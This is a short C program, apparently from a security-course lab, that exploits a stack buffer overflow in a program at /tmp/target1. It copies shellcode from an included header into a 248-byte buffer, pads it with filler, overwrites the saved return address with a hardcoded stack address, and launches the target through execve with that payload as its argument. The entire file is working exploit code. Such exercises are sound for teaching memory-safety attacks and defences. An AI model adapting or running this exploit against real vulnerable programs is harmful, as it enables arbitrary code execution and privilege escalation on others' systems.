#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];
  
  char input[249];
  input[248] = '\0';
  
  int i;
  for (i = 0 ; i < 244 ; i++) {
	  if (i < strlen(shellcode)) input[i] = shellcode[i];
	  else input[i] = 'f';
  }
  
  input[244] = '\x88';
  input[245] = '\xfc';
  input[246] = '\xff';
  input[247] = '\xbf';

  args[0] = TARGET; args[1] = input; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
